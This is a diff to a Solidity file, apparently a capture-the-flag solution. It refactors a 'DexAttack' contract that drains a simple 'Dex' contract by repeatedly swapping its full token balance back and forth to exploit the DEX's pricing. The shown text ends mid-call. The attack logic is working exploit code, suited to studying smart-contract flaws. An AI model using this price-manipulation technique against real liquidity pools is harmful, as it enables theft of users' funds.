@@ -5,9 +5,6 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-// 0x8e988DcCe2B558C8EeafcC6C2d5948B418525E7e
-// Token 1 0xAA51A6DF058CA0c6C2E20987f7a794E3901675F1
-// Token 2 0x9498b9cEA4708e209B802C7b15eD68D071F72778
 contract Dex is Ownable {
     address public token1;
     address public token2;
@@ -94,19 +91,23 @@ contract DexAttack {
 
     function attack() public {
         // Approve the dex to spend our tokens
-        dex.approve(address(dex), token1.balanceOf(address(this)));
-        dex.approve(address(dex), token2.balanceOf(address(this)));
+        dex.approve(address(dex), 10e9);
+        dex.approve(address(dex), 10e9);
         // Do 5 swaps of 1 token for the other
-        bool buyingToken2 = true;
         for (uint i = 0; i < 5; i++) {
-            if (buyingToken2) {
-                uint amount = token1.balanceOf(address(this));
-                dex.swap(address(token1), address(token2), amount);
+            if (i % 2 == 0) {
+                dex.swap(
+                    address(token1),
+                    address(token2),
+                    token1.balanceOf(address(this))
+                );
             } else {
-                uint amount = token2.balanceOf(address(this));
-                dex.swap(address(token2), address(token1), amount);
+                dex.swap(
+                    address(token2),
+                    address(token1),
+                    token2.balanceOf(address(this))
+                );
             }
-            buyingToken2 = !buyingToken2;
         }
         // Finish him off
         dex.swap(
